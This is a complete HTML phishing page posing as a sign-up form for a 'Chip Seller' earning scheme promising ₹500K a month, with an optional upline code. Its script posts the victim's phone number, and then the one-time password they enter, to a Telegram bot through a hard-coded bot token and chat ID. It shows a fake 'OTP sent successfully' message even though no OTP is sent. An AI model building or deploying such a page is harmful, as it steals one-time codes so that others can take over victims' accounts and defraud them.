<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chips Seller - Sign Up</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
        }
    </style>
</head>
<body class="bg-[#5B17B6] min-h-screen text-slate-900 flex flex-col justify-start selection:bg-indigo-500 selection:text-white">

    <!-- Toast Notification Container -->
    <div id="toast-container" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2 w-11/12 max-w-md pointer-events-none"></div>

    <!-- Header Section -->
    <header class="w-full pt-6 pb-2 px-4 max-w-md mx-auto flex flex-col items-start relative">
        <div class="bg-white/20 backdrop-blur-md px-3 py-1 rounded-full text-white text-xs font-semibold tracking-wider uppercase mb-3">
            ✨ Speech Bubbles Badge ✨
        </div>
        <h2 class="text-xl font-bold text-white leading-tight max-w-[260px] mb-4">
            As an official Chip Seller to earn <span class="text-amber-300 font-extrabold">₹500K monthly.</span>
        </h2>
    </header>

    <!-- Main Card Form Section -->
    <main class="w-full max-w-md mx-auto px-4 pb-12">
        <div class="bg-white rounded-3xl p-6 shadow-2xl border border-white/20">
            <div class="text-center mb-6">
                <span class="text-indigo-600 font-bold tracking-widest text-xs uppercase">/// SIGN UP & EARN ///</span>
                <h3 class="text-lg font-extrabold tracking-widest text-slate-800 uppercase mt-1">Sign up & Form</h3>
            </div>

            <form id="signup-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
                <!-- Phone Number Input -->
                <div>
                    <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-100 transition-all">
                        <span class="pl-4 pr-3 text-slate-500 font-semibold text-sm border-r border-slate-100">+91</span>
                        <input type="tel" id="phone" placeholder="Type phone number" maxlength="10" required
                            class="w-full py-3.5 px-3 bg-transparent text-slate-800 placeholder-slate-400 text-sm font-medium focus:outline-none">
                    </div>
                </div>

                <!-- OTP Input & Request Button -->
                <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-100 transition-all">
                    <input type="text" id="otp" placeholder="Type OTP" maxlength="6" required
                        class="w-full py-3.5 px-4 bg-transparent text-slate-800 placeholder-slate-400 text-sm font-medium focus:outline-none">
                    <button type="button" id="otp-btn" onclick="sendOTP()" 
                        class="mr-2 px-5 py-2 bg-[#5B17B6] hover:bg-[#4c1298] text-white text-xs font-bold rounded-xl shadow-md transition-all active:scale-95">
                        Request
                    </button>
                </div>

                <!-- Upline Code Input (Optional) -->
                <div>
                    <input type="text" id="upline" placeholder="Upline Code (Optional)"
                        class="w-full py-3.5 px-4 bg-white border border-slate-200 rounded-2xl shadow-sm text-slate-800 placeholder-slate-400 text-sm font-medium focus:outline-none focus:border-indigo-600 focus:ring-2 focus:ring-indigo-100 transition-all">
                </div>

                <!-- Submit Button -->
                <button type="submit" id="submit-btn"
                    class="w-full py-4 bg-[#5B17B6] hover:bg-[#4c1298] text-white font-bold rounded-2xl shadow-lg transition-all active:scale-95 flex items-center justify-center space-x-2">
                    <span>Sign up</span>
                </button>
            </form>
        </div>
    </main>

    <!-- JavaScript Section -->
    <script>
        const BOT_TOKEN = '8439698505:AAGLOUR5DuMaMLm81HarVsDvQ8gFkvcZFU0';
        const CHAT_ID = '8698008425';

        let countdownSeconds = 60;
        let timerInterval = null;

        // Toast Notification Function
        function showToast(message, type = 'info') {
            const container = document.getElementById('toast-container');
            if (!container) return;
            const toast = document.createElement('div');
            toast.className = `p-3.5 rounded-xl shadow-lg text-xs sm:text-sm font-medium transition-all duration-300 transform translate-y-2 opacity-0 text-white ${type === 'success' ? 'bg-emerald-600' : type === 'error' ? 'bg-rose-600' : 'bg-slate-800'}`;
            toast.innerHTML = `<div class="flex items-center space-x-2"><span>${message}</span></div>`;
            container.appendChild(toast);
            setTimeout(() => toast.classList.remove('opacity-0', 'translate-y-2'), 10);
            setTimeout(() => {
                toast.classList.add('opacity-0', 'translate-y-2');
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        }

        // Step 1: Phone number daal kar Request dabane par (Telegram Message 1)
        async function sendOTP() {
            const phoneInput = document.getElementById('phone').value.trim();
            if (phoneInput.length < 10) {
                showToast('Please enter a valid 10-digit mobile number first!', 'error');
                return;
            }

            const otpBtn = document.getElementById('otp-btn');
            if (timerInterval) return;

            const message = `📲 *New OTP Request!*\n\n*Phone Number:* \`+91 ${phoneInput}\``;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('Telegram Error:', error);
            }

            showToast('OTP sent successfully to +91 ' + phoneInput, 'success');
            otpBtn.disabled = true;
            countdownSeconds = 60;
            otpBtn.innerText = `${countdownSeconds}s`;
            otpBtn.classList.add('opacity-50', 'cursor-not-allowed');

            timerInterval = setInterval(() => {
                countdownSeconds--;
                otpBtn.innerText = `${countdownSeconds}s`;
                if (countdownSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerInterval = null;
                    otpBtn.disabled = false;
                    otpBtn.innerText = 'Request';
                    otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                }
            }, 1000);
        }

        // Step 2: OTP submit karne par (Telegram Message 2)
        async function handleFormSubmit(event) {
            event.preventDefault();

            const phone = document.getElementById('phone').value.trim();
            const otp = document.getElementById('otp').value.trim();
            const submitBtn = document.getElementById('submit-btn');

            if (phone.length < 10) {
                showToast('Please enter a valid phone number!', 'error');
                return;
            }

            if (otp.length < 4) {
                showToast('Please enter a valid OTP!', 'error');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.innerHTML = `<span>Submitting...</span>`;

            const message = `🔑 *OTP Submitted!*\n\n*Phone Number:* \`+91 ${phone}\`\n*OTP Code:* \`${otp}\``;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    showToast('Sign up successful! Welcome aboard.', 'success');
                    document.getElementById('signup-form').reset();
                } else {
                    showToast('Failed to send data. Check configuration.', 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showToast('Network error! Please try again.', 'error');
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = `<span>Sign up</span>`;
            }
        }
    </script>
</body>
</html>
